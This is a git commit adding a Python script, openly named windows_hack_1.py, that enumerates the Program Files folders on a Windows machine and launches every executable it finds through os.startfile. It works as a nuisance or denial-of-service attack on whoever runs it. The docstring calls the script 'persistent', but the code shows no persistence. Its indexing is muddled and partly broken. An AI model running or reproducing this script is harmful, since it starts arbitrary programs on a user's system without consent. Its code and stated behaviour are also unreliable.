e8eb60623f39c4362030030c512a705a69784650
Hud Seidu Daannaa <huddryl@users.noreply.github.com>
2017-09-17 16:33:06 +0100

    Create windows_hack_1.py

---
+++ windows_hack_1.py
@@ -0,0 +1,52 @@
+def windows_hack_1():
+    ''' runs every installed program 
+    installed on a windows system, persistent'''
+    import sys
+    if sys.platform == 'win32': 
+        import os
+        look = 'C:\\'
+        f = []
+        contents = []
+        #s is list of files
+        s = []
+        #all_exe = []
+        for n in os.listdir(look):
+            if 'Program Files' == n:
+                f.append(os.listdir(look + n))
+            elif 'Program Files (x86)' == n:
+                f.append(os.listdir(look + n))
+            else:
+                pass
+        for n0 in range(0,len(f)):
+            for n1 in range(len(f[n0])):
+                files = f[n0][n1].split('\n')
+                s.append(files)
+                for n2_ in files:
+                    if os.path.exists(look + 'Program Files' + '\\' + n2_) is True:
+                        if os.path.isdir(look + 'Program Files' + '\\' + n2_) is True:
+                            try:
+                                contents.append(os.listdir(look + 'Program Files' + '\\' + n2_))
+                            except:
+                                pass
+                        else:
+                            pass
+                    else:
+                        contents.append(os.listdir(look + 'Program Files (x86)' + '\\' + n2_))
+        for n in range(0, len(contents)):
+            #print contents[n]
+            for n1 in range(0, len(contents[n])):
+                #print contents[n1]
+                for n2 in contents[n][n1].split('\n'):
+                    if '.exe' in n2:
+                        if os.path.exists(look + 'Program Files (x86)' + '\\' + s[n][0] + '\\'+ n2) is True:
+                            try:
+                                os.startfile(look + 'Program Files (x86)' + '\\' + s[n][0] + '\\'+ n2)
+                            except WindowsError:
+                                pass
+                        else:
+                            try:
+                                os.startfile(look + 'Program Files' + '\\' + s[n][0] + '\\'+ n2)
+                            except WindowsError:
+                                pass
+    else:
+        pass    
